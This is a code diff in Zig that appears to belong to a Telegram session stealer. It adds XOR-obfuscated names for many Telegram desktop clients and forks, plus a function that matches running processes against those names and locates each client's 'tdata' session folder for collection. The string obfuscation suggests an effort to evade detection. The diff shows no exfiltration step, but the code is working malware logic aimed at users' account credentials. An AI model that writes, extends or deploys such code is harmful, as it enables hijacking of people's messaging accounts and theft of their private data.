@@ -16,6 +16,27 @@ const E = struct {
     const CONFIGS = hash.xorEncrypt("configs");
     const MAPS = hash.xorEncrypt("maps");
     const ENCRYPTED_PATHS = [_][]const u8{ &TELEGRAM, &AYUGRAM, &CATOGRAM, &NEKOGRAM, &KOTATOGRAM, &UNIGRAM, &IME };
+
+    pub const PROC_TG = hash.xorEncrypt("Telegram");
+    pub const PROC_AYU = hash.xorEncrypt("AyuGram");
+    pub const PROC_64G = hash.xorEncrypt("64Gram");
+    pub const PROC_CTO = hash.xorEncrypt("Catogram");
+    pub const PROC_NKO = hash.xorEncrypt("Nekogram");
+    pub const PROC_KTA = hash.xorEncrypt("Kotatogram");
+    pub const PROC_FRK = hash.xorEncrypt("Forkgram");
+    pub const PROC_UNI = hash.xorEncrypt("Unigram");
+    pub const PROC_IME = hash.xorEncrypt("iMe");
+    pub const DIR_TG = hash.xorEncrypt("Telegram Desktop");
+    pub const DIR_AYU = hash.xorEncrypt("AyuGram Desktop");
+    pub const DIR_64G = hash.xorEncrypt("64Gram Desktop");
+    pub const DIR_CTO = hash.xorEncrypt("Catogram");
+    pub const DIR_NKO = hash.xorEncrypt("Nekogram");
+    pub const DIR_KTA = hash.xorEncrypt("Kotatogram");
+    pub const DIR_FRK = hash.xorEncrypt("Forkgram");
+    pub const DIR_UNI = hash.xorEncrypt("Unigram");
+    pub const DIR_IME = hash.xorEncrypt("iMe");
+    pub const PROC_NAMES = [_][]const u8{ &PROC_TG, &PROC_AYU, &PROC_64G, &PROC_CTO, &PROC_NKO, &PROC_KTA, &PROC_FRK, &PROC_UNI, &PROC_IME };
+    pub const DIR_NAMES = [_][]const u8{ &DIR_TG, &DIR_AYU, &DIR_64G, &DIR_CTO, &DIR_NKO, &DIR_KTA, &DIR_FRK, &DIR_UNI, &DIR_IME };
 };
 
 fn collectSessionFile(files: *std.ArrayList([]const u8), allocator: std.mem.Allocator, base: []const u8, name: []const u8) bool {
@@ -130,6 +151,53 @@ pub fn collect(allocator: std.mem.Allocator, roaming: []const u8, local: []const
     }
 
     return all_files.toOwnedSlice();
+}
+
+pub fn discoverByProcess(allocator: std.mem.Allocator, roaming: []const u8) ![][]const u8 {
+    const processes_module = @import("../system/processes.zig");
+    const procs = try processes_module.collect(allocator);
+    defer {
+        for (procs) |p| allocator.free(p.name);
+        allocator.free(procs);
+    }
+
+    var proc_bufs: [E.PROC_NAMES.len][32]u8 = undefined;
+    var dir_bufs: [E.DIR_NAMES.len][64]u8 = undefined;
+
+    inline for (E.PROC_NAMES, 0..) |enc, i| {
+        hash.xorDecrypt(enc, proc_bufs[i][0..enc.len]);
+    }
+    inline for (E.DIR_NAMES, 0..) |enc, i| {
+        hash.xorDecrypt(enc, dir_bufs[i][0..enc.len]);
+    }
+
+    var results = std.ArrayList([]const u8).init(allocator);
+    errdefer {
+        for (results.items) |p| allocator.free(p);
+        results.deinit();
+    }
+
+    var tdata_buf: [E.TDATA.len]u8 = undefined;
+    hash.xorDecrypt(&E.TDATA, &tdata_buf);
+    const tdata_name = tdata_buf[0..];
+
+    for (procs) |proc| {
+        inline for (E.PROC_NAMES, 0..) |_, i| {
+            const mod_name = proc_bufs[i][0..E.PROC_NAMES[i].len];
+            if (!std.ascii.startsWithIgnoreCase(proc.name, mod_name)) continue;
+
+            const dir_name = dir_bufs[i][0..E.DIR_NAMES[i].len];
+            const tdata_path = std.fs.path.join(allocator, &[_][]const u8{ roaming, dir_name, tdata_name }) catch continue;
+            var dir = std.fs.openDirAbsolute(tdata_path, .{ .iterate = true }) catch {
+                allocator.free(tdata_path);
+                continue;
+            };
+            dir.close();
+            try results.append(tdata_path);
+        }
+    }
+
+    return results.toOwnedSlice();
 }
 
 test "collect returns empty for nonexistent paths" {
